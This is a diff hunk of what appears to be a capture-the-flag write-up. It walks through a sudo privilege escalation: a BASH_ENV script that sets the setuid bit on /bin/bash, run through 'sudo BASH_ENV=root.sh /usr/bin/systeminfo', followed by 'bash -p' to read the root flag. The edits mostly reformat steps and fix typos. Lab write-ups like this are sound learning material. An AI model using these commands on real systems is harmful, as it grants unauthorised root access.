@@ -231,30 +231,32 @@ hish@environment:~$
 
 Analyzing the script, I noticed sudo keeps ENV/BASH_ENV (env_keep+="ENV BASH_ENV"). Because systeminfo is a bash script, I can set BASH_ENV to a file I control and it gets sourced as root when running sudo /usr/bin/systeminfo—this is an environment-variable (BASH_ENV) abuse.
 
-1. I will create a root.sh bash script.
+I will create a root.sh bash script.
+
 ```bash
 bash-5.2# cat root.sh
 #!/bin/bash
 
 chmod +s /bin/bash
 ```
-2. set permessions to 777 for everyone.
+set permessions to 777 for everyone.
 
 ```bash
 chmod 777 root.sh
 ```
 
-3. Execute the systeminfo binary with changed BASH_ENV we created.
+Execute the systeminfo binary with changed BASH_ENV we created.
+
 ```bash
 sudo BASH_ENV=root.sh /usr/bin/systeminfo
 ```
 
-4. Start bash in privileged mode
+Start bash in privileged mode
 ```bash
 /bin/bash -p
 ```
 
-now we are run and can grap a flag.
+now we are root and can grab root flag.
 
 ```bash
 bash-5.2# cat /root/root.txt
